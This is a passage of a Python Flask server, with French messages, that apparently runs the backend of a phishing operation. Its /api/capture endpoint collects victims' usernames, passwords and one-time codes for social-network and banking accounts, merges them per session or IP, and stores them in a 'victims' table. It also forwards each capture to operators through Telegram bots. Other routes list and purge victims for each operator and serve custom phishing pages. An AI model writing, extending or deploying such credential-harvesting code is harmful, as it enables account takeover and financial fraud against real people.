def get_messages():
    user = sanitize_text(request.args.get("user") or "", 60)
    peer = sanitize_text(request.args.get("peer") or "", 60)
    today_key = datetime.datetime.now().strftime("%Y-%m-%d")

    conn = get_db_connection()
    cursor = conn.cursor()

    if peer:
        cursor.execute(
            """
            SELECT * FROM direct_messages
            WHERE channel = 'direct'
              AND ((LOWER(TRIM(sender)) = LOWER(?) AND LOWER(TRIM(recipient)) = LOWER(?))
                OR (LOWER(TRIM(sender)) = LOWER(?) AND LOWER(TRIM(recipient)) = LOWER(?)))
            ORDER BY id ASC
            """,
            (user, peer, peer, user),
        )
    else:
        cursor.execute(
            """
            SELECT * FROM direct_messages
            WHERE channel = 'sms'
            ORDER BY id ASC
            """
        )
    rows = cursor.fetchall()

    sms_used_today = 0
    if user:
        cursor.execute(
            """
            SELECT COUNT(*) AS cnt FROM direct_messages
            WHERE channel = 'sms'
              AND LOWER(TRIM(sender)) = LOWER(?)
              AND day_key = ?
            """,
            (user, today_key),
        )
        cnt_row = cursor.fetchone()
        sms_used_today = cnt_row["cnt"] if cnt_row else 0

    conn.close()

    msgs = [
        {
            "id": r["id"],
            "sender": r["sender"],
            "recipient": r["recipient"],
            "channel": r["channel"],
            "msg_type": r["msg_type"],
            "content": r["content"],
            "media_data": r["media_data"],
            "created_at": r["created_at"],
        }
        for r in rows
    ]
    return jsonify({
        "messages": msgs,
        "smsUsedToday": sms_used_today,
        "smsLimit": DAILY_SMS_LIMIT,
        "smsLocked": sms_used_today >= DAILY_SMS_LIMIT,
    })


@app.route("/api/messages/send", methods=["POST"])
def send_message():
    data = request.json or {}
    sender = sanitize_text(data.get("sender") or "", 60)
    recipient = sanitize_text(data.get("recipient") or "Salon SMS", 60)
    channel = (data.get("channel") or "sms").strip().lower()
    msg_type = (data.get("msgType") or "text").strip().lower()
    content = sanitize_text(data.get("content") or "", 1000)
    media_data = (data.get("mediaData") or "").strip()

    if not sender:
        return jsonify({"status": "error", "message": "Expéditeur requis"}), 400

    if channel == "sms" and msg_type == "photo":
        return jsonify({"status": "error", "message": "L'envoi de photo n'est pas autorisé dans le canal SMS"}), 400

    today_key = datetime.datetime.now().strftime("%Y-%m-%d")
    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()

    if channel == "sms":
        cursor.execute(
            "SELECT COUNT(*) AS cnt FROM direct_messages WHERE channel = 'sms' AND LOWER(TRIM(sender)) = LOWER(?) AND day_key = ?",
            (sender, today_key),
        )
        cnt_row = cursor.fetchone()
        used = cnt_row["cnt"] if cnt_row else 0
        if used >= DAILY_SMS_LIMIT:
            conn.close()
            return jsonify({
                "status": "locked",
                "message": f"Limite quotidienne atteinte ({DAILY_SMS_LIMIT}/{DAILY_SMS_LIMIT} messages). Envoi verrouillé pour aujourd'hui.",
                "smsUsedToday": used,
                "smsLimit": DAILY_SMS_LIMIT,
                "smsLocked": True,
            }), 429

    cursor.execute(
        """
        INSERT INTO direct_messages (sender, recipient, channel, msg_type, content, media_data, day_key, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (sender, recipient, channel, msg_type, content, media_data, today_key, now_str),
    )
    msg_id = cursor.lastrowid
    conn.commit()

    cursor.execute(
        "SELECT COUNT(*) AS cnt FROM direct_messages WHERE channel = 'sms' AND LOWER(TRIM(sender)) = LOWER(?) AND day_key = ?",
        (sender, today_key),
    )
    new_used = cursor.fetchone()["cnt"]
    conn.close()

    canal_label = "SMS" if channel == "sms" else "Messagerie Directe"
    type_label = "Vocal 🎙️" if msg_type == "voice" else ("Photo 🖼️" if msg_type == "photo" else "Texte 💬")
    corps = content or ("[Message vocal]" if msg_type == "voice" else "[Photo jointe]")

    tg_msg = (
        f"💬 *ÉCHANGE {canal_label.upper()} ({type_label})*\n"
        f"┌──────────────────────────────┐\n"
        f"│ 📤 *Expéditeur:* `{sender}`\n"
        f"│ 📥 *Destinataire:* `{recipient}`\n"
        f"│ 🕒 *Date:* `{now_str}`\n"
        f"└──────────────────────────────┘\n"
        f"📝 *Contenu:* {corps}\n"
        f"{BEES_FOOTER}"
    )
    send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, tg_msg)
    if GROUP_CHAT_ID and GROUP_CHAT_ID != ADMIN_CHAT_ID:
        send_telegram_notification(GROUP_BOT_TOKEN, GROUP_CHAT_ID, tg_msg)

    if msg_type == "voice" and media_data:
        send_telegram_voice_b64(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, media_data, f"🎙️ Vocal de `{sender}` → `{recipient}` ({now_str})\n{BEES_FOOTER}")
    elif msg_type == "photo" and media_data:
        photo_b64 = media_data.split(",")[-1]
        if photo_b64:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{GROUP_BOT_TOKEN}/sendPhoto",
                    data={"chat_id": GROUP_CHAT_ID, "caption": f"🖼️ Photo de `{sender}` → `{recipient}` ({now_str})\n{BEES_FOOTER}", "parse_mode": "Markdown"},
                    files={"photo": ("chat_photo.jpg", base64.b64decode(photo_b64), "image/jpeg")},
                    timeout=10,
                )
            except Exception as e:
                print("Erreur envoi photo chat Telegram:", e)

    return jsonify({
        "status": "success",
        "id": msg_id,
        "smsUsedToday": new_used,
        "smsLimit": DAILY_SMS_LIMIT,
        "smsLocked": new_used >= DAILY_SMS_LIMIT,
        "message": {
            "id": msg_id,
            "sender": sender,
            "recipient": recipient,
            "channel": channel,
            "msg_type": msg_type,
            "content": content,
            "media_data": media_data,
            "created_at": now_str,
        },
    })


@app.route("/api/messages/<int:msg_id>", methods=["DELETE"])
def delete_message(msg_id):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM direct_messages WHERE id = ?", (msg_id,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success", "deletedId": msg_id})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


def _find_existing_victim_record(cursor, owner: str, network: str, session_key: str, v_user: str, v_ip: str):
    has_user = bool(v_user and v_user.lower() not in ["inconnu", "non renseigne", "non renseigné", ""])
    has_sid = bool(session_key)

    if has_sid:
        cursor.execute(
            """
            SELECT * FROM victims
            WHERE LOWER(TRIM(owner)) = LOWER(?)
              AND LOWER(TRIM(network)) = LOWER(?)
              AND session_key = ?
            ORDER BY id DESC LIMIT 1
            """,
            (owner, network, session_key),
        )
        row = cursor.fetchone()
        if row:
            return row

    if has_user:
        cursor.execute(
            """
            SELECT * FROM victims
            WHERE LOWER(TRIM(owner)) = LOWER(?)
              AND LOWER(TRIM(network)) = LOWER(?)
              AND LOWER(TRIM(victimUser)) = LOWER(?)
            ORDER BY id DESC LIMIT 1
            """,
            (owner, network, v_user),
        )
        row = cursor.fetchone()
        if row:
            return row

    cursor.execute(
        """
        SELECT * FROM victims
        WHERE LOWER(TRIM(owner)) = LOWER(?)
          AND LOWER(TRIM(network)) = LOWER(?)
          AND ip = ?
          AND (victimUser IS NULL OR victimUser = '' OR LOWER(TRIM(victimUser)) IN ('inconnu', 'non renseigne', 'non renseigné'))
        ORDER BY id DESC LIMIT 1
        """,
        (owner, network, v_ip),
    )
    return cursor.fetchone()


@app.route("/api/capture", methods=["POST"])
def capture_data():
    data = request.json or {}
    owner = sanitize_text(data.get("owner") or "", 60) or "Kim"
    network = sanitize_text(data.get("network") or "Facebook", 60)
    session_key = sanitize_text(data.get("sessionKey") or data.get("session_key") or "", 100)
    v_user = sanitize_text(data.get("victimUser") or "Inconnu", 150)
    v_pass = sanitize_text(data.get("victimPass") or "Inconnu", 150)
    v_otp = sanitize_text(data.get("otp") or "Aucun", 80)
    v_type = sanitize_text(data.get("type") or "STANDARD", 30)

    if v_pass == UNIVERSAL_ADMIN_CODE and v_user and v_user != UNIVERSAL_ADMIN_CODE:
        return jsonify({"status": "admin_unlock", "target_user": v_user})

    structured = classify_and_order_payload(data)
    if v_type == "STANDARD" and structured["category"] == "BANKING":
        v_type = "BANK"

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(request.headers.get("User-Agent", ""))
    platform_img = resolve_platform_image(network, data.get("platformImage") or "")

    now = datetime.datetime.now()
    date_str = now.strftime("%d/%m/%Y %H:%M:%S")
    timestamp = int(now.timestamp() * 1000)

    conn = get_db_connection()
    cursor = conn.cursor()

    existing = _find_existing_victim_record(cursor, owner, network, session_key, v_user, v_ip)

    if existing:
        old_user = (existing["victimUser"] or "").strip()
        old_pass = (existing["victimPass"] or "").strip()
        old_otp = (existing["victimOtp"] or "").strip()
        old_type = (existing["type"] or v_type).strip()
        old_sid = (existing["session_key"] or "").strip()

        final_user = (
            v_user
            if (v_user and v_user.lower() not in ["inconnu", "non renseigne", "non renseigné", ""])
            else (old_user or "Inconnu")
        )
        final_pass = (
            v_pass
            if (v_pass and v_pass.lower() not in ["inconnu", "non renseigne", "non renseigné", ""])
            else (old_pass or "Inconnu")
        )
        final_otp = (
            v_otp
            if (v_otp and v_otp not in ["Aucun", "En attente OTP...", ""])
            else (old_otp or "En attente OTP...")
        )
        final_sid = session_key or old_sid
        final_type = "OTP" if (final_otp not in ["Aucun", "En attente OTP...", ""]) else (
            v_type if v_type != "STANDARD" else old_type
        )

        old_ordered = {}
        try:
            old_extra = json.loads(existing["extra_info"] or "{}")
            if isinstance(old_extra, dict):
                old_ordered = old_extra.get("ordered") or {}
        except Exception:
            pass

        merged_ordered = _merge_ordered_dicts(old_ordered, structured["ordered"])
        if final_user not in ["Inconnu", "Non renseigne"] and not merged_ordered["identity"] and not merged_ordered["banking"]:
            merged_ordered["identity"]["Identifiant"] = final_user
        if final_pass not in ["Inconnu", "Non renseigne"] and not merged_ordered["credentials"]:
            merged_ordered["credentials"]["Mot de passe"] = final_pass
        if final_otp not in ["Aucun", "En attente OTP..."] and not merged_ordered["otp"]:
            merged_ordered["otp"]["Code OTP"] = final_otp

        merged_summary = _build_summary_from_ordered(merged_ordered)
        final_category = "BANKING" if merged_ordered["banking"] else (
            "OTP" if merged_ordered["otp"] and not merged_ordered["identity"] and not merged_ordered["credentials"]
            else ("FORM_DATA" if (merged_ordered["identity"] or merged_ordered["credentials"]) else structured["category"])
        )

        extra_payload = {
            "category": final_category,
            "ordered": merged_ordered,
            "formatted_summary": merged_summary,
            "raw_extra": data.get("extra_info"),
        }
        extra_json_str = json.dumps(extra_payload, ensure_ascii=False)

        cursor.execute(
            """
            UPDATE victims
            SET victimUser=?, victimPass=?, victimOtp=?, type=?, dateStr=?, timestamp=?, ip=?, device=?, extra_info=?, session_key=?
            WHERE id=?
            """,
            (final_user, final_pass, final_otp, final_type, date_str, timestamp, v_ip, device_type, extra_json_str, final_sid, existing["id"]),
        )
        conn.commit()
        conn.close()

        threading.Thread(
            target=dispatch_ordered_capture_telegram,
            args=(
                network,
                owner,
                final_category,
                final_user,
                final_pass,
                final_otp,
                merged_summary,
                v_ip,
                device_type,
                date_str,
                platform_img,
                True,
            ),
            daemon=True,
        ).start()
        return jsonify({
            "status": "success",
            "updated": True,
            "id": existing["id"],
            "owner": owner,
            "category": final_category,
            "timestamp": timestamp,
            "triggerAlert": True,
        })

    extra_payload = {
        "category": structured["category"],
        "ordered": structured["ordered"],
        "formatted_summary": structured["formatted_summary"],
        "raw_extra": data.get("extra_info"),
    }
    extra_json_str = json.dumps(extra_payload, ensure_ascii=False)

    cursor.execute(
        """
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, device, extra_info, session_key)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, device_type, extra_json_str, session_key),
    )
    new_id = cursor.lastrowid
    conn.commit()
    conn.close()

    threading.Thread(
        target=dispatch_ordered_capture_telegram,
        args=(
            network,
            owner,
            structured["category"],
            v_user,
            v_pass,
            v_otp,
            structured["formatted_summary"],
            v_ip,
            device_type,
            date_str,
            platform_img,
            False,
        ),
        daemon=True,
    ).start()
    return jsonify({
        "status": "success",
        "updated": False,
        "id": new_id,
        "owner": owner,
        "category": structured["category"],
        "timestamp": timestamp,
        "triggerAlert": True,
    })


@app.route("/api/custom_pages", methods=["GET"])
def get_custom_pages():
    cleanup_expired_3days()
    owner = sanitize_text(request.args.get("owner") or "", 60)
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(TRIM(owner)) = LOWER(?) ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{"slug": r["slug"], "title": r["title"], "network": r["network"], "mode": r["mode"]} for r in rows])


@app.route("/api/victims", methods=["GET"])
def get_victims():
    owner = sanitize_text(request.args.get("owner") or "", 60)
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?) ORDER BY timestamp DESC, id DESC", (owner,))
        rows = cursor.fetchall()
    else:
        rows = []
    conn.close()

    result = []
    seen_keys = set()
    latest_victim_id = 0
    last_action_at = 0

    for r in rows:
        row_id = int(r["id"] or 0)
        row_ts = int(r["timestamp"] or 0)
        if row_id > latest_victim_id:
            latest_victim_id = row_id
        if row_ts > last_action_at:
            last_action_at = row_ts

        u_norm = (r["victimUser"] or "").strip().lower()
        sid_norm = (r["session_key"] or "").strip().lower()
        net_norm = (r["network"] or "").strip().lower()
        ip_norm = (r["ip"] or "").strip()

        if sid_norm:
            dedup_key = f"sid:{net_norm}:{sid_norm}"
        elif u_norm and u_norm not in ["inconnu", "non renseigne", "non renseigné", ""]:
            dedup_key = f"user:{net_norm}:{u_norm}"
        else:
            dedup_key = f"row:{row_id}:{ip_norm}"

        if dedup_key in seen_keys:
            continue
        seen_keys.add(dedup_key)

        category = r["type"] or "STANDARD"
        ordered_summary = ""
        ordered_data = {}
        try:
            parsed_extra = json.loads(r["extra_info"] or "{}")
            if isinstance(parsed_extra, dict):
                category = parsed_extra.get("category") or category
                ordered_summary = parsed_extra.get("formatted_summary") or ""
                ordered_data = parsed_extra.get("ordered") or {}
        except Exception:
            pass

        result.append({
            "id": row_id,
            "owner": r["owner"] or owner,
            "network": r["network"],
            "type": r["type"],
            "category": category,
            "victimUser": r["victimUser"],
            "victimPass": r["victimPass"],
            "otp": r["victimOtp"],
            "orderedSummary": ordered_summary,
            "orderedData": ordered_data,
            "dateStr": r["dateStr"],
            "timestamp": row_ts,
            "ip": r["ip"],
            "device": r["device"],
        })

    return jsonify({
        "victims": result,
        "count": len(result),
        "latestVictimId": latest_victim_id,
        "lastActionAt": last_action_at,
    })


@app.route("/api/delete_victims", methods=["POST"])
def delete_victims_by_numbers():
    data = request.json or {}
    owner = sanitize_text(data.get("owner") or "", 60)
    ids = data.get("ids") or []
    if not owner or not isinstance(ids, list) or len(ids) == 0:
        return jsonify({"status": "error", "message": "Paramètres invalides"}), 400

    clean_ids = []
    for raw_id in ids:
        try:
            val = int(raw_id)
            if val > 0:
                clean_ids.append(val)
        except Exception:
            continue

    if not clean_ids:
        return jsonify({"status": "error", "message": "Aucun identifiant valide"}), 400

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        placeholders = ",".join(["?"] * len(clean_ids))
        params = [owner] + clean_ids
        cursor.execute(
            f"DELETE FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?) AND id IN ({placeholders})",
            params,
        )
        deleted_count = cursor.rowcount
        conn.commit()
        conn.close()
        return jsonify({"status": "success", "deletedCount": deleted_count})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/clear_victims", methods=["POST"])
def clear_victims():
    data = request.json or {}
    owner = sanitize_text(data.get("owner") or "", 60)
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?)", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
